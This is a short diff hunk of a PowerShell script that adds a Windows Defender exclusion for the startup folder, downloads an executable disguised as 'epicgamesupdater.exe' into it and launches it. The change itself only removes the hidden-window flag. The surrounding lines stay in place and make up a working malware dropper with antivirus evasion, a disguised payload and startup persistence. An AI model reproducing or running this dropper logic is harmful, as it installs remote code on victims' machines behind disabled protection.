@@ -5,9 +5,10 @@ $exePath = "$startupPath\epicgamesupdater.exe"
 try { Add-MpPreference -ExclusionPath $startupPath -EA 0 } catch {}
 try {
     Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA Stop
-    Start-Process -FilePath $exePath -WindowStyle Hidden
+    Start-Process -FilePath $exePath
 } catch {}
 
 exit
+
 
 
